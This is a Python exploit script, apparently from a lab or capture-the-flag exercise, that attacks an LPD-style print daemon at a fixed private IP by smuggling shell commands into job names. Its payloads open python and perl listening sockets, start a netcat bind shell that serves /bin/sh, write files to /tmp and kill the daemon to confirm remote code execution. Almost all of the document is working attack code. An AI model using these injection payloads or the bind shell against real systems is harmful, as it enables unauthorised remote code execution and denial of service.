#!/usr/bin/env python3
"""Verify RCE by checking port state changes after LPD injection"""
import socket, time

TARGET = '10.129.38.158'

def check_port(port, timeout=3):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((TARGET, port))
        s.close()
        return 'LISTENING'
    except socket.timeout:
        return 'TIMEOUT'
    except ConnectionRefusedError:
        return 'REFUSED'
    except OSError as e:
        return f'OSERROR({e.errno})'

def lpd(jn, timeout=6):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((TARGET, 1515))
        s.send(b'\x02archive_intake')
        time.sleep(0.2)
        s.recv(1024)
        ct = (f'J{jn}\n').encode()
        s.send(b'\x01' + str(len(ct)).encode() + b'\n' + ct)
        time.sleep(0.4)
        s.recv(4096)
        time.sleep(0.2)
        s.recv(4096)
    except Exception as e:
        return str(e)
    s.close()
    return 'OK'

# Get baseline port states
print("=== Baseline port states ===", flush=True)
for port in [7777, 8888, 9999, 8080, 4444, 1234]:
    state = check_port(port)
    print(f"  Port {port}: {state}", flush=True)

print("\n=== Test 1: Try python3 TCP server ===", flush=True)
# Try python3 first
r = lpd("';python3 -c \"import socket;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('',7777));s.listen(5)\" & #'")
print(f"  LPD result: {r}", flush=True)
time.sleep(3)

state = check_port(7777)
print(f"  Port 7777 after python3: {state}", flush=True)

if 'LISTENING' in state or 'TIMEOUT' in state:
    print("  *** RCE CONFIRMED! Port state changed!", flush=True)

print("\n=== Test 2: Try python TCP server ===", flush=True)
r = lpd("';python -c \"import socket;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('',7777));s.listen(5)\" & #'")
print(f"  LPD result: {r}", flush=True)
time.sleep(3)

state = check_port(7777)
print(f"  Port 7777 after python: {state}", flush=True)

print("\n=== Test 3: Try nc, socat, perl, busybox ===", flush=True)
tests = [
    ("nc -l -p 8888 -e /bin/sh", 8888),
    ("perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in(8889,INADDR_ANY));listen(S,5);while(1){accept(C,S);print C \"OK\\n\";close C}'", 8889),
]
for cmd, port in tests:
    r = lpd(f"';{cmd} & #'")
    time.sleep(0.5)

time.sleep(3)
for _, port in tests:
    state = check_port(port)
    print(f"  Port {port}: {state}", flush=True)

print("\n=== Test 4: Create file and check via archive.log timing ===", flush=True)
# If RCE works, the file creation should happen before we submit the next job
# Write to archive.log which we know the daemon writes to
lpd("';echo RCE_WORKS_'\"'\"'$(date +%s)'\"'\"' >> /tmp/archive.log;'")
time.sleep(1)

# Submit another job with a unique name - if RCE worked, both entries appear in archive.log
# But we still can't read it... Let's try a DIFFERENT approach
# Use the file-existence oracle: create a file, then try to read it
lpd("';touch /tmp/rce_flag_'\"'\"'$(date +%s)'\"'\"';'")
time.sleep(1)

print("\n=== Test 5: Crash daemon test (LAST RESORT) ===", flush=True)
# Check baseline: daemon should be alive
s = socket.socket()
s.settimeout(5)
try:
    s.connect((TARGET, 1515))
    s.send(b'\x03archive_intake')
    time.sleep(0.5)
    data = s.recv(4096)
    print(f"  Daemon alive: {data}", flush=True)
except:
    print("  Daemon NOT responding before test!", flush=True)
s.close()

# Inject a command to kill the daemon
print("  Injecting kill command...", flush=True)
lpd("';pkill -f server.py 2>/dev/null;'", timeout=3)
time.sleep(2)

# Check if daemon is dead
s = socket.socket()
s.settimeout(5)
try:
    s.connect((TARGET, 1515))
    s.send(b'\x03archive_intake')
    time.sleep(0.5)
    data = s.recv(4096)
    print(f"  Daemon still alive: {data}", flush=True)
except:
    print(f"  *** DAEMON CRASHED! RCE CONFIRMED via kill command!", flush=True)
s.close()

print("\n=== SUMMARY ===", flush=True)
